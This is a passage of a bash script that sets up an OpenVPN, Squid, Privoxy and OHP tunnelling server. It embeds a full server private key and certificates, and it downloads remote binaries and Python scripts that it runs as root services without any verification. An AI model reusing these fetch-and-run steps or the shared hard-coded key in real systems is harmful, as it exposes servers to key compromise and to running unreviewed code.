biBGb3JkIE1hbmdpbGltYW4xIjAgBgkqhkiG9w0BCQEWE2FkbWluQGpvaG5mb3Jk
dHYubWUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCf+WkN868YMiCl
d3z1Tq2OeRNb6ljiRGzEi1qrIvj/gXq6o0QD0SD+Nf3QWJrrJYFi1GECq72PNFhy
2jLFgZH0RRLOVZfG+jwZ9itxofweiwALvgMdz2e+mpQItMxKh1ZYkzNw+4zJ7zJV
u0Tq7YGPaMFPkLNU3V454rDYCdI8GG/wPDoW5FMc3FogI8fwylQvTWyE0yxHMxH6
FkISA5hOuSo6MO1FgAfDdNNwxa/MAbpHwJ+W6RBHv4lhE6bQePMCj/90pgt3NpxF
i++qwpSRfOR6OuuyDr1c++z6qhjLB7YzDLzj+HXCyfsPWPj+gJ0+3ckhW4gf/nhR
uB+BTd8fAgMBAAGjggEdMIIBGTAdBgNVHQ4EFgQULXGeDQBLXCPId0F3r/58FDCm
jC4wgekGA1UdIwSB4TCB3oAULXGeDQBLXCPId0F3r/58FDCmjC6hgbqkgbcwgbQx
CzAJBgNVBAYTAlBIMQ8wDQYDVQQIEwZUYXJsYWMxEzARBgNVBAcTCkNvbmNlcGNp
b24xEzARBgNVBAoTCkpvaG5Gb3JkVFYxEzARBgNVBAsTCkpvaG5Gb3JkVFYxEjAQ
BgNVBAMTCURlYmlhblZQTjEdMBsGA1UEKRMUSm9obiBGb3JkIE1hbmdpbGltYW4x
IjAgBgkqhkiG9w0BCQEWE2FkbWluQGpvaG5mb3JkdHYubWWCCQCMWw3L4erzxDAM
BgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBZUpwZ+LQWAQI8VW3hdZVN
WV+P12yYQ1UzyagtB3MqBR4aZhjk42NFBrwPZwpvWUXB0GB4DhBuvbVPtqnt5p4V
sDtQ6vKYeDlE/KDGDc0oJDsgxo2wwIXy+y/14EDqidAVjtf1rk5MDAAEVvonHxkP
861kzoIOZ0+D7sJDo3aZ8uNy8UznrRSzLDT63o28DkL3iLASyt1GHWu05wYmgzsg
m+w+AWvN5rL65mzyn/Bipf0I9snVB4saCgfy7TCI/4slOcMCNc2e6oOwOLvFA+s8
dZMt2qg62PEOj/LblYGD+qLn0xLRwqK0UWSmWobz5LXoxyssZLK2KiMkS41PHkfh
-----END CERTIFICATE-----
EOF7
 cat <<'EOF9'> /etc/openvpn/server.crt
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1 (0x1)
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=PH, ST=Tarlac, L=Concepcion, O=JohnFordTV, OU=JohnFordTV, CN=DebianVPN/name=John Ford Mangiliman/emailAddress=admin@johnfordtv.me
        Validity
            Not Before: Nov 25 08:06:59 2019 GMT
            Not After : Nov 22 08:06:59 2029 GMT
        Subject: C=PH, ST=Tarlac, L=Concepcion, O=JohnFordTV, OU=JohnFordTV, CN=DebianVPN/name=John Ford Mangiliman/emailAddress=admin@johnfordtv.me
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:c6:6d:3d:64:58:08:e2:70:9b:a3:55:75:ec:5a:
                    6e:9d:bc:7c:45:f5:64:c5:f6:23:2e:b0:1f:28:2e:
                    cb:60:8d:71:73:3d:c4:e6:f7:e3:36:0b:ad:9d:87:
                    f5:4b:2f:85:5f:d8:c9:88:d9:86:4a:52:ce:2b:39:
                    c6:b9:83:e0:7e:ab:8e:1f:2f:11:cc:08:15:12:62:
                    dd:8d:94:b1:79:3c:52:d9:cb:0a:6a:db:64:8b:ff:
                    c7:41:5c:cc:f9:18:4f:74:1a:e7:c1:b4:b8:89:fd:
                    56:5f:5c:65:c4:21:a8:08:98:3d:8e:35:44:b3:6f:
                    93:b5:01:59:b4:35:23:99:00:79:fa:44:df:b3:4c:
                    76:bf:3c:e4:f7:39:3e:50:e0:fe:85:8c:a0:e2:63:
                    b1:ec:a3:32:cd:6b:9d:5a:0e:f6:66:92:ac:6f:15:
                    5e:bb:3a:48:d9:3d:63:94:ff:9c:fb:d2:fe:5a:11:
                    b5:1a:c1:6c:8a:9e:d3:29:8d:d6:ff:fc:9f:9f:a4:
                    ad:9d:a0:ca:2b:6f:63:47:7f:7b:3c:98:bf:14:18:
                    6c:36:38:7a:c3:5d:a9:5a:26:28:12:33:9d:17:1b:
                    6f:2f:5d:33:e7:b5:8f:57:3a:3a:29:57:6a:0e:9e:
                    84:7a:60:d9:9c:fb:c7:f3:f8:93:a7:cd:43:89:ec:
                    3f:d3
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints:
                CA:FALSE
            Netscape Cert Type:
                SSL Server
            Netscape Comment:
                Easy-RSA Generated Server Certificate
            X509v3 Subject Key Identifier:
                50:31:04:C4:7A:47:C1:DA:46:CC:77:38:DE:1C:63:10:40:C3:80:22
            X509v3 Authority Key Identifier:
                keyid:2D:71:9E:0D:00:4B:5C:23:C8:77:41:77:AF:FE:7C:14:30:A6:8C:2E
                DirName:/C=PH/ST=Tarlac/L=Concepcion/O=JohnFordTV/OU=JohnFordTV/CN=DebianVPN/name=John Ford Mangiliman/emailAddress=admin@johnfordtv.me
                serial:8C:5B:0D:CB:E1:EA:F3:C4

            X509v3 Extended Key Usage:
                TLS Web Server Authentication
            X509v3 Key Usage:
                Digital Signature, Key Encipherment
            X509v3 Subject Alternative Name:
                DNS:server
    Signature Algorithm: sha256WithRSAEncryption
         87:59:21:fd:7d:41:c8:87:8f:ff:13:85:e9:ae:31:da:43:bc:
         48:3b:32:41:ba:65:82:9e:76:25:cd:43:8b:fc:07:16:49:c3:
         8d:bd:ad:bf:0e:f6:d3:53:35:de:f2:c6:a6:62:c2:79:e1:49:
         a5:ba:55:cf:b9:e9:58:d8:e5:02:96:0a:2a:97:7d:82:85:0b:
         38:b5:dc:0d:6b:bd:51:a6:f7:3f:71:94:90:c9:ad:51:69:15:
         24:58:04:99:96:69:40:9d:a1:9c:1c:a3:34:be:b9:c2:86:61:
         ab:18:03:9b:27:b1:9f:1d:a3:5e:29:47:16:6f:7e:55:62:93:
         57:85:45:34:2c:cb:10:2c:da:f0:9a:ee:3d:b2:92:87:d4:7e:
         1b:c7:66:22:e9:4c:a2:95:d0:df:32:1a:87:ce:8a:27:08:f2:
         87:a9:e6:eb:16:37:71:35:37:4d:8c:0e:df:12:d3:e0:63:0a:
         53:7d:c8:02:c5:34:c5:23:68:c3:ba:33:5b:ad:92:bd:e2:d0:
         9d:bc:bd:bd:0d:64:50:0f:f4:bd:91:fc:10:e0:ec:01:e8:a1:
         50:ed:79:bf:12:49:bc:a4:93:17:d6:71:ed:9e:99:f3:42:6d:
         26:b3:2d:ac:32:62:98:71:d1:e4:83:6c:58:02:e6:49:b6:c9:
         73:76:eb:8b
-----BEGIN CERTIFICATE-----
MIIFfzCCBGegAwIBAgIBATANBgkqhkiG9w0BAQsFADCBtDELMAkGA1UEBhMCUEgx
DzANBgNVBAgTBlRhcmxhYzETMBEGA1UEBxMKQ29uY2VwY2lvbjETMBEGA1UEChMK
Sm9obkZvcmRUVjETMBEGA1UECxMKSm9obkZvcmRUVjESMBAGA1UEAxMJRGViaWFu
VlBOMR0wGwYDVQQpExRKb2huIEZvcmQgTWFuZ2lsaW1hbjEiMCAGCSqGSIb3DQEJ
ARYTYWRtaW5Aam9obmZvcmR0di5tZTAeFw0xOTExMjUwODA2NTlaFw0yOTExMjIw
ODA2NTlaMIG0MQswCQYDVQQGEwJQSDEPMA0GA1UECBMGVGFybGFjMRMwEQYDVQQH
EwpDb25jZXBjaW9uMRMwEQYDVQQKEwpKb2huRm9yZFRWMRMwEQYDVQQLEwpKb2hu
Rm9yZFRWMRIwEAYDVQQDEwlEZWJpYW5WUE4xHTAbBgNVBCkTFEpvaG4gRm9yZCBN
YW5naWxpbWFuMSIwIAYJKoZIhvcNAQkBFhNhZG1pbkBqb2huZm9yZHR2Lm1lMIIB
IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxm09ZFgI4nCbo1V17Fpunbx8
RfVkxfYjLrAfKC7LYI1xcz3E5vfjNgutnYf1Sy+FX9jJiNmGSlLOKznGuYPgfquO
Hy8RzAgVEmLdjZSxeTxS2csKattki//HQVzM+RhPdBrnwbS4if1WX1xlxCGoCJg9
jjVEs2+TtQFZtDUjmQB5+kTfs0x2vzzk9zk+UOD+hYyg4mOx7KMyzWudWg72ZpKs
bxVeuzpI2T1jlP+c+9L+WhG1GsFsip7TKY3W//yfn6StnaDKK29jR397PJi/FBhs
Njh6w12pWiYoEjOdFxtvL10z57WPVzo6KVdqDp6EemDZnPvH8/iTp81Diew/0wID
AQABo4IBmDCCAZQwCQYDVR0TBAIwADARBglghkgBhvhCAQEEBAMCBkAwNAYJYIZI
AYb4QgENBCcWJUVhc3ktUlNBIEdlbmVyYXRlZCBTZXJ2ZXIgQ2VydGlmaWNhdGUw
HQYDVR0OBBYEFFAxBMR6R8HaRsx3ON4cYxBAw4AiMIHpBgNVHSMEgeEwgd6AFC1x
ng0AS1wjyHdBd6/+fBQwpowuoYG6pIG3MIG0MQswCQYDVQQGEwJQSDEPMA0GA1UE
CBMGVGFybGFjMRMwEQYDVQQHEwpDb25jZXBjaW9uMRMwEQYDVQQKEwpKb2huRm9y
ZFRWMRMwEQYDVQQLEwpKb2huRm9yZFRWMRIwEAYDVQQDEwlEZWJpYW5WUE4xHTAb
BgNVBCkTFEpvaG4gRm9yZCBNYW5naWxpbWFuMSIwIAYJKoZIhvcNAQkBFhNhZG1p
bkBqb2huZm9yZHR2Lm1lggkAjFsNy+Hq88QwEwYDVR0lBAwwCgYIKwYBBQUHAwEw
CwYDVR0PBAQDAgWgMBEGA1UdEQQKMAiCBnNlcnZlcjANBgkqhkiG9w0BAQsFAAOC
AQEAh1kh/X1ByIeP/xOF6a4x2kO8SDsyQbplgp52Jc1Di/wHFknDjb2tvw7201M1
3vLGpmLCeeFJpbpVz7npWNjlApYKKpd9goULOLXcDWu9Uab3P3GUkMmtUWkVJFgE
mZZpQJ2hnByjNL65woZhqxgDmyexnx2jXilHFm9+VWKTV4VFNCzLECza8JruPbKS
h9R+G8dmIulMopXQ3zIah86KJwjyh6nm6xY3cTU3TYwO3xLT4GMKU33IAsU0xSNo
w7ozW62SveLQnby9vQ1kUA/0vZH8EODsAeihUO15vxJJvKSTF9Zx7Z6Z80JtJrMt
rDJimHHR5INsWALmSbbJc3briw==
-----END CERTIFICATE-----
EOF9
 cat <<'EOF10'> /etc/openvpn/server.key
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDGbT1kWAjicJuj
VXXsWm6dvHxF9WTF9iMusB8oLstgjXFzPcTm9+M2C62dh/VLL4Vf2MmI2YZKUs4r
Oca5g+B+q44fLxHMCBUSYt2NlLF5PFLZywpq22SL/8dBXMz5GE90GufBtLiJ/VZf
XGXEIagImD2ONUSzb5O1AVm0NSOZAHn6RN+zTHa/POT3OT5Q4P6FjKDiY7HsozLN
a51aDvZmkqxvFV67OkjZPWOU/5z70v5aEbUawWyKntMpjdb//J+fpK2doMorb2NH
f3s8mL8UGGw2OHrDXalaJigSM50XG28vXTPntY9XOjopV2oOnoR6YNmc+8fz+JOn
zUOJ7D/TAgMBAAECggEBALidRIRKwCFmIfhKeAfqb4aEqp8wXI0un7c9mA970i9I
CijtbHh0ZEqRfPvXViqY0R/HBGM195LJDhb7j2BlSYaxOO7cjVNmpaxQnc+va5vf
uzn1hgC7lQYIeSvgGrkbnDjrG3uHGDcSpLzeq7RamAs/Ee5wszW7dxLuabaXxkH/
owRXl6wvwD1WNGZsWJe8eP6GtBePm9+Ls5VLN0DPWyuJCFxhN/VpvvphECFt7EPF
qY+ysAFqfSYkCyH7OklnLIx1jQ04iLbZ4HI+S9QH+w1261fDgCXAmf1kgXkgLaM6
4wK+e93JRyqw87NZZIKN3ooq35n6wAUaS2erIYQFjrkCgYEA5c6qeNORIuq4F1jP
JS9aaXEjaAKIgw20qTyZfhQv6AhkJ7GASgWSdBIIfZQo1JG4EsXwqQ/0x9EwDOVu
glTYMT3tMi0zrzMklYS1G8iQElywAfTro/8sngfimvkQeRljoNdlrzO4+knUXmV8
DymPDH6UGlhj2FwCFN+obhT1f48CgYEA3QrzBK+YRu6iqeMuifwXlcbUS/A+dBPJ
qoYDzM6Zc0LYRTZSqhEHC8XkcQp/18LUxXFSrZXP2lcKmkqg4pgeAxALRLJW2pfz
yAm1Hah5JXlvTjX4HnMTFL4fvB0oGZXsAimPNa/wUZvTSPYJRziZdEwVubW3AAxE
THN3qxXoGX0CgYAWeSxwnnf+CygvmE7BmyzjTN4iiMTi1A9L0ZJNIxpAPbnVq+UY
2AynbzAHX9rSVuHCbDsJvXa5p7pkOHejJTrzLdQpaQQ56O119cFkUyvLr+bCejol
EopBdhHyB9NVlGcKzqWyCYPYbinnhVMphG3p0eMX5Hb3LKBDfE/TXBdZ/wKBgEwe
3iup8M3Ulk3c/4TjPJgGvctc85Tzz4oa1qosJ6oKxgGnwHXyoTOLtay8CeSaor1P
1kITCl5NhUg3FQqTihpR5x+ELubeV0R3G1kYUIf4Nr1/Vm/d/x8wjisw+0M8Xucr
urapXSAtgmho2i8drbLgFMc8bcXlc4vEY9yWEbTdAoGAMa6KTb0U9M47mpJb23zu
WiO8mFqSPYAnhHmXOiBOPlCoVpRbPquk3Xq32g9KU97jPNrH4X2HKgYpboMTWYOJ
kR3Y5UeFF1xurA/RXUEREcP1zg6Uei5aj7S4Sp7CVfIQCOpJ8S/I4CZdAcvwY+pI
ZTC1+KZJbFyPwFcrIylEeBc=
-----END PRIVATE KEY-----
EOF10
 cat <<'EOF13'> /etc/openvpn/dh2048.pem
-----BEGIN DH PARAMETERS-----
MIIBCAKCAQEAlrn8QcDrwXzqWCI7NMhPJVgEjdSxvyHw3EDVN8JrVfMegnvZA0VZ
St3hduXTzlT7ceUGIxTJpM8RE6d3f1mMPnZJ4hBxJzzjrwMgSCupJrQDjSAIWGLZ
elcmJS6WOAibpxzFIiPB6pRjoLaJF8b/J+YnO0bLUt1senWkg9ql8mU74VM1aG3A
jOPztpLqYIRwla11bqAl4UcFLBI+PXAcPJsAIfzZ3DMn7aOa3Or6UjSmVQ8jGY/8
1F0T67NgB8U7FrOVNimRlWfSJ//FiJkP0PScHVX2NQ0Cgwdo+wekjoFN5xbPxicc
LxNkdRPpCACgzdo1M77xVsurtfcxsz+RswIBAg==
-----END DH PARAMETERS-----
EOF13

 # installing ohp
 wget https://github.com/lfasmpao/open-http-puncher/releases/download/0.1/ohpserver-linux32.zip
 unzip ohpserver-linux32.zip
 chmod 755 ohpserver
 sudo mv ohpserver /usr/local/bin/

 # Getting all dns inside resolv.conf then use as Default DNS for our openvpn server
 grep -v '#' /etc/resolv.conf | grep 'nameserver' | grep -E -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | while read -r line; do
	echo "push \"dhcp-option DNS $line\"" >> /etc/openvpn/server_tcp.conf
done

 # Creating a New update message in server.conf
 cat <<'NUovpn' > /etc/openvpn/server.conf
 # New Update are now released, OpenVPN Server
 # are now running both TCP and UDP Protocol. (Both are only running on IPv4)
 # But our native server.conf are now removed and divided
 # Into two different configs base on their Protocols:
 #  * OpenVPN TCP (located at /etc/openvpn/server_tcp.conf
 #  * OpenVPN UDP (located at /etc/openvpn/server_udp.conf
 # 
 # Also other logging files like
 # status logs and server logs
 # are moved into new different file names:
 #  * OpenVPN TCP Server logs (/etc/openvpn/tcp.log)
 #  * OpenVPN UDP Server logs (/etc/openvpn/udp.log)
 #  * OpenVPN TCP Status logs (/etc/openvpn/tcp_stats.log)
 #  * OpenVPN UDP Status logs (/etc/openvpn/udp_stats.log)
 #
 # Server ports are configured base on env vars
 # executed/raised from this script (OpenVPN_TCP_Port/OpenVPN_UDP_Port)
 #
 # Enjoy the new update
 # Script Updated by Nima SSH
NUovpn

 # setting openvpn server port
 sed -i "s|OVPNTCP|$OpenVPN_TCP_Port|g" /etc/openvpn/server_tcp.conf
 sed -i "s|OVPNUDP|$OpenVPN_UDP_Port|g" /etc/openvpn/server_udp.conf
 
 # Getting some OpenVPN plugins for unix authentication
 cd
 wget https://github.com/johndesu090/AutoScriptDB/raw/master/Files/Plugins/plugin.tgz
 tar -xzvf /root/plugin.tgz -C /etc/openvpn/
 rm -f plugin.tgz
 
 # Some workaround for OpenVZ machines for "Startup error" openvpn service
 if [[ "$(hostnamectl | grep -i Virtualization | awk '{print $2}' | head -n1)" == 'openvz' ]]; then
 sed -i 's|LimitNPROC|#LimitNPROC|g' /lib/systemd/system/openvpn*
 systemctl daemon-reload
fi

 # Allow IPv4 Forwarding
 sed -i '/net.ipv4.ip_forward.*/d' /etc/sysctl.conf
 sed -i '/net.ipv4.ip_forward.*/d' /etc/sysctl.d/*.conf
 echo 'net.ipv4.ip_forward=1' > /etc/sysctl.d/20-openvpn.conf
 sysctl --system &> /dev/null

 # Iptables Rule for OpenVPN server
cat > /etc/iptables.up.rules <<-END
*nat
:PREROUTING ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
-A POSTROUTING -j SNAT --to-source xxxxxxxxx
-A POSTROUTING -o eth0 -j MASQUERADE
-A POSTROUTING -s 10.200.0.0/16 -o eth0 -j MASQUERADE
-A POSTROUTING -s 10.201.0.0/16 -o eth0 -j MASQUERADE
COMMIT

*filter
:INPUT ACCEPT [19406:27313311]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [9393:434129]
:fail2ban-ssh - [0:0]
-A FORWARD -i eth0 -o ppp0 -m state --state RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -i ppp0 -o eth0 -j ACCEPT
-A INPUT -s xxxxxxxxx -p tcp -m multiport --dport 1:65535 -j ACCEPT
-A INPUT -p tcp -m multiport --dports 22 -j fail2ban-ssh
-A INPUT -p tcp -m multiport --dports 226 -j fail2ban-ssh
-A INPUT -p ICMP --icmp-type 8 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 110 -j ACCEPT
-A INPUT -p tcp --dport 22  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 226  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 110  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 80  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 445  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 442  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 443  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 444  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 25222  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 587  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 3355  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 3355  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 8085  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 8086  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 3356  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 8086  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 60000  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 60000  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 7300  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 7300  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 85  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 85  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 10000  -m state --state NEW -j ACCEPT
-A fail2ban-ssh -j RETURN
COMMIT

*raw
:PREROUTING ACCEPT [158575:227800758]
:OUTPUT ACCEPT [46145:2312668]
COMMIT

*mangle
:PREROUTING ACCEPT [158575:227800758]
:INPUT ACCEPT [158575:227800758]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [46145:2312668]
:POSTROUTING ACCEPT [46145:2312668]
COMMIT
END

sed -i $MYIP2 /etc/iptables.up.rules;
iptables-restore < /etc/iptables.up.rules

 # Create and Configure rc.local
 cat > /etc/rc.local <<-END
#!/bin/sh -e

exit 0
END

 chmod +x /etc/rc.local
 sed -i '$ i\echo "nameserver 8.8.8.8" > /etc/resolv.conf' /etc/rc.local
 sed -i '$ i\echo "nameserver 8.8.4.4" >> /etc/resolv.conf' /etc/rc.local
 sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
 
 # Enabling IPv4 Forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 # Starting OpenVPN server
 systemctl start openvpn@server_tcp
 systemctl enable openvpn@server_tcp
 systemctl start openvpn@server_udp
 systemctl enable openvpn@server_udp

}
function InsProxy(){

 # Removing Duplicate privoxy config
 rm -rf /etc/privoxy/config*
 
 # Creating Privoxy server config using cat eof tricks
 cat <<'privoxy' > /etc/privoxy/config
# My Privoxy Server Config
user-manual /usr/share/doc/privoxy/user-manual
confdir /etc/privoxy
logdir /var/log/privoxy
filterfile default.filter
logfile logfile
listen-address 0.0.0.0:Privoxy_Port1
listen-address 0.0.0.0:Privoxy_Port2
toggle 1
enable-remote-toggle 0
enable-remote-http-toggle 0
enable-edit-actions 0
enforce-blocks 0
buffer-limit 4096
enable-proxy-authentication-forwarding 1
forwarded-connect-retries 1
accept-intercepted-requests 1
allow-cgi-request-crunching 1
split-large-forms 0
keep-alive-timeout 5
tolerate-pipelining 1
socket-timeout 300
permit-access 0.0.0.0/0 IP-ADDRESS
privoxy

 # Setting machine's IP Address inside of our privoxy config(security that only allows this machine to use this proxy server)
 sed -i "s|IP-ADDRESS|$IPADDR|g" /etc/privoxy/config
 
 # Setting privoxy ports
 sed -i "s|Privoxy_Port1|$Privoxy_Port1|g" /etc/privoxy/config
 sed -i "s|Privoxy_Port2|$Privoxy_Port2|g" /etc/privoxy/config

 # Removing Duplicate Squid config
 rm -rf /etc/squid/squid.con*
 
 # Creating Squid server config using cat eof tricks
 cat <<'mySquid' > /etc/squid/squid.conf
# My Squid Proxy Server Config
acl VPN dst IP-ADDRESS/32
http_access allow VPN
http_access deny all 
http_port 0.0.0.0:Squid_Port1
http_port 0.0.0.0:Squid_Port2
http_port 0.0.0.0:Squid_Port3
### Allow Headers
request_header_access Allow allow all 
request_header_access Authorization allow all 
request_header_access WWW-Authenticate allow all 
request_header_access Proxy-Authorization allow all 
request_header_access Proxy-Authenticate allow all 
request_header_access Cache-Control allow all 
request_header_access Content-Encoding allow all 
request_header_access Content-Length allow all 
request_header_access Content-Type allow all 
request_header_access Date allow all 
request_header_access Expires allow all 
request_header_access Host allow all 
request_header_access If-Modified-Since allow all 
request_header_access Last-Modified allow all 
request_header_access Location allow all 
request_header_access Pragma allow all 
request_header_access Accept allow all 
request_header_access Accept-Charset allow all 
request_header_access Accept-Encoding allow all 
request_header_access Accept-Language allow all 
request_header_access Content-Language allow all 
request_header_access Mime-Version allow all 
request_header_access Retry-After allow all 
request_header_access Title allow all 
request_header_access Connection allow all 
request_header_access Proxy-Connection allow all 
request_header_access User-Agent allow all 
request_header_access Cookie allow all 
request_header_access All deny all
### HTTP Anonymizer Paranoid
reply_header_access Allow allow all 
reply_header_access Authorization allow all 
reply_header_access WWW-Authenticate allow all 
reply_header_access Proxy-Authorization allow all 
reply_header_access Proxy-Authenticate allow all 
reply_header_access Cache-Control allow all 
reply_header_access Content-Encoding allow all 
reply_header_access Content-Length allow all 
reply_header_access Content-Type allow all 
reply_header_access Date allow all 
reply_header_access Expires allow all 
reply_header_access Host allow all 
reply_header_access If-Modified-Since allow all 
reply_header_access Last-Modified allow all 
reply_header_access Location allow all 
reply_header_access Pragma allow all 
reply_header_access Accept allow all 
reply_header_access Accept-Charset allow all 
reply_header_access Accept-Encoding allow all 
reply_header_access Accept-Language allow all 
reply_header_access Content-Language allow all 
reply_header_access Mime-Version allow all 
reply_header_access Retry-After allow all 
reply_header_access Title allow all 
reply_header_access Connection allow all 
reply_header_access Proxy-Connection allow all 
reply_header_access User-Agent allow all 
reply_header_access Cookie allow all 
reply_header_access All deny all
### CoreDump
coredump_dir /var/spool/squid
dns_nameservers 8.8.8.8 8.8.4.4
refresh_pattern ^ftp: 1440 20% 10080
refresh_pattern ^gopher: 1440 0% 1440
refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
refresh_pattern . 0 20% 4320
visible_hostname JohnFordTV
mySquid

 # Setting machine's IP Address inside of our Squid config(security that only allows this machine to use this proxy server)
 sed -i "s|IP-ADDRESS|$IPADDR|g" /etc/squid/squid.conf
 
 # Setting squid ports
 sed -i "s|Squid_Port1|$Squid_Port1|g" /etc/squid/squid.conf
 sed -i "s|Squid_Port2|$Squid_Port2|g" /etc/squid/squid.conf
 sed -i "s|Squid_Port3|$Squid_Port3|g" /etc/squid/squid.conf

 # Starting Proxy server
 echo -e "Restarting proxy server..."
 systemctl restart squid
 
 # Configure Socks
 wget -O /home/proxydirect.py "https://raw.githubusercontent.com/Alaminbd257/AlaminMixFiles/main/socks1"

 sed -i "s|Socks_port|$Socks_port|g" "/home/proxydirect.py"
 sed -i "s|SSH_Extra_Port|$SSH_Port1|g" "/home/proxydirect.py"
 sed -i "s|VPN_Name|$VPN_Name|g" "/home/proxydirect.py"
 sed -i "s|OpenVPN_TCP_Port|$OpenVPN_TCP_Port|g" "/home/proxydirect.py"

#Adding Autorecon Socks 
 wget -O /home/proxydirect2.py "https://raw.githubusercontent.com/Alaminbd257/AlaminMixFiles/main/socks2"

 sed -i "s|Socks2_port|$Socks2_port|g" "/home/proxydirect2.py"
 sed -i "s|SSH_Extra_Port|$SSH_Port1|g" "/home/proxydirect2.py"
 sed -i "s|VPN_Name|$VPN_Name|g" "/home/proxydirect2.py"
 sed -i "s|OpenVPN_TCP_Port|$OpenVPN_TCP_Port|g" "/home/proxydirect2.py"

#Adding OVPN Autorecon Socks 
 wget -O /home/proxydirect3.py "https://raw.githubusercontent.com/Alaminbd257/AlaminMixFiles/main/socks3"

 sed -i "s|Socks3_port|$Socks3_port|g" "/home/proxydirect3.py"
 sed -i "s|SSH_Extra_Port|$SSH_Port1|g" "/home/proxydirect3.py"
 sed -i "s|VPN_Name|$VPN_Name|g" "/home/proxydirect3.py"
 sed -i "s|OpenVPN_TCP_Port|$OpenVPN_TCP_Port|g" "/home/proxydirect3.py"
 
 # run socks as daemon
cat <<'socks' > /etc/systemd/system/socks.service
[Unit]
Description=Daemonize socks

[Service]
Type=simple
ExecStart=/usr/bin/python /home/proxydirect.py

[Install]
WantedBy=multi-user.target
socks

 # adding ohp daemons
cat <<'ohpssh1' > /etc/systemd/system/ohpford.service
[Unit]
Description=Daemonize OpenHTTP Puncher Autorecon
Wants=network.target
After=network.target

[Service]
ExecStart=/usr/local/bin/ohpserver -port SSH_viaAuto -proxy 127.0.0.1:Squid_Proxy_2 -tunnel IP-ADDRESS:SSH_Extra_Port
Restart=always
RestartSec=3
[Install]
WantedBy=multi-user.target
ohpssh1

sed -i "s|SSH_viaAuto|$SSH_viaAuto|g" "/etc/systemd/system/ohpford.service"
sed -i "s|Squid_Proxy_2|$Squid_Port2|g" "/etc/systemd/system/ohpford.service"
sed -i "s|IP-ADDRESS|$IPADDR|g" "/etc/systemd/system/ohpford.service"
sed -i "s|SSH_Extra_Port|$SSH_Port1|g" "/etc/systemd/system/ohpford.service"

cat <<'ohpssh2' > /etc/systemd/system/ohpssh2.service
[Unit]
Description=Daemonize OpenHTTP Puncher Autorecon
Wants=network.target
After=network.target

[Service]
ExecStart=/usr/local/bin/ohpserver -port SSH_viaOHP -proxy 127.0.0.1:Squid_Proxy_2 -tunnel IP-ADDRESS:SSH_Extra_Port
Restart=always
RestartSec=3
[Install]
WantedBy=multi-user.target
ohpssh2

sed -i "s|SSH_viaOHP|$SSH_viaOHP|g" "/etc/systemd/system/ohpssh2.service"
sed -i "s|Squid_Proxy_2|$Squid_Port2|g" "/etc/systemd/system/ohpssh2.service"
sed -i "s|IP-ADDRESS|$IPADDR|g" "/etc/systemd/system/ohpssh2.service"
sed -i "s|SSH_Extra_Port|$SSH_Port1|g" "/etc/systemd/system/ohpssh2.service"

cat <<'ohpssh3' > /etc/systemd/system/ohpdropbear.service
[Unit]
Description=Daemonize OpenHTTP Puncher Dropbear
Wants=network.target
After=network.target

[Service]
ExecStart=/usr/local/bin/ohpserver -port Dropbear_OHP -proxy 127.0.0.1:Squid_Proxy_2 -tunnel IP-ADDRESS:Dropbear_Port1
Restart=always
RestartSec=3
[Install]
WantedBy=multi-user.target
ohpssh3

sed -i "s|Dropbear_OHP|$Dropbear_OHP|g" "/etc/systemd/system/ohpdropbear.service"
sed -i "s|Squid_Proxy_2|$Squid_Port2|g" "/etc/systemd/system/ohpdropbear.service"
sed -i "s|IP-ADDRESS|$IPADDR|g" "/etc/systemd/system/ohpdropbear.service"
sed -i "s|Dropbear_Port1|$Dropbear_Port1|g" "/etc/systemd/system/ohpdropbear.service"

cat <<'ohpovpn' > /etc/systemd/system/ohpovpn.service
[Unit]
Description=Daemonize OpenHTTP Puncher Dropbear
Wants=network.target
After=network.target

[Service]
ExecStart=/usr/local/bin/ohpserver -port OpenVPN_TCP_OHP -proxy 127.0.0.1:Squid_Proxy_2 -tunnel IP-ADDRESS:OpenVPN_TCP_Port
Restart=always
RestartSec=3
[Install]
WantedBy=multi-user.target
ohpovpn

sed -i "s|Dropbear_OHP|$Dropbear_OHP|g" "/etc/systemd/system/ohpovpn.service"
